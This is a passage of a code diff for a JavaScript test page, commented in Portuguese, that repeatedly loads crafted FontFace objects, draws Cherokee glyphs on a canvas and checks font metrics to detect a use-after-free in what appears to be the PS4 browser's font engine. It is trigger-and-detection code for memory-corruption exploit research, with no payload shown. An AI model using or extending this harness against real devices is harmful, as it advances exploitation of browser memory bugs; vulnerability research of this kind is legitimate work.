+      const uid = ts+'_a'+attempt+'_'+Math.random().toString(36).slice(2);
+      const c   = document.createElement('canvas');
+      c.width   = 64; c.height = 64;
+      const ctx = c.getContext('2d');
+      keepAlive.push(c, ctx, ...dummies);
+
+      ctx.font = '10px "da_'+uid+'","ta_'+uid+'"';
+
+      const donor  = new FontFace('da_'+uid, makeSrc(attempt));
+      const target = new FontFace('ta_'+uid, makeSrc(attempt),
+        {unicodeRange:'U+13A0-13FF'});
+      document.fonts.add(donor);
+      document.fonts.add(target);
+      keepAlive.push(donor, target);
+
+      ctx.fillText('\u13A0\u13A2\u13A4', 2, 32);
+      ctx.strokeText('\u13A0\u13A2\u13A4', 2, 50);
+
+      const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
+      const fba = tm.fontBoundingBoxAscent;
+      const ema = tm.emHeightAscent;
+
+      if((fba!==11 && fba!==8) || (ema!==11 && ema!==8)) {
+        anomalies++;
+        hi('attempt='+attempt+' N='+N+' fba='+fba+' ema='+ema+' → ANÔMALO!');
+      }
+
+      if(attempt % 50 === 49) {
+        info('attempt='+attempt+'/500 anomalias='+anomalies+' excepções='+exceptions);
+      }
+    } catch(e) {
+      exceptions++;
+      err('EXCEÇÃO attempt='+attempt+' N='+N+': '+e.message);
+    }
   }
-  showSummary();
+
+  if(anomalies > 0) {
+    hi('UAF DETECTADO: '+anomalies+' anomalias em 500 tentativas!');
+  } else if(exceptions > 0) {
+    warn(exceptions+' exceções — possível crash parcial do motor');
+  } else {
+    ok('E3: 500 tentativas sem anomalias ou crashes');
+    warn('Conclusão: width() no PS4 não pumpa localTarget durante drawTextUnchecked');
+    warn('O trigger ctx.font setter é confirmado mas o 2º passo (V3 via width) não ocorre');
+    warn('→ Enviar FontCascadeFonts.cpp para confirmar o policy usado em glyphDataForCharacter');
+  }
 }
 
 function runAll() {
   clearLog();
-  if (!checkAPIs()) return;
-
-  hdr('INICIANDO TODOS OS TESTES');
-  info('Ordem: B1 → B2 → C1 → D1 → D2 → Stress');
-  info('Qualquer crash interrompe a execução — resultado estará no log.');
-
-  pathB1();
-  pathB2();
-  pathC1();
-  pathD1();
-  pathD2();
-  pathStress();
-
-  hdr('TODOS OS TESTES CONCLUÍDOS');
-  showSummary();
-}
-
-function showSummary() {
-  if (Object.keys(results).length === 0) return;
-  sumEl.style.display = 'block';
-  sumEl.innerHTML = '<b>Resumo:</b><br>' +
-    Object.entries(results).map(([k, v]) =>
-      `<span style="color:${v.includes('exceção') ? '#f44' : '#4f4'}">${k}: ${v}</span>`
-    ).join('<br>');
+  runE1();
+  runE2();
+  runE3();
 }
 </script>
-
 </body>
 </html>
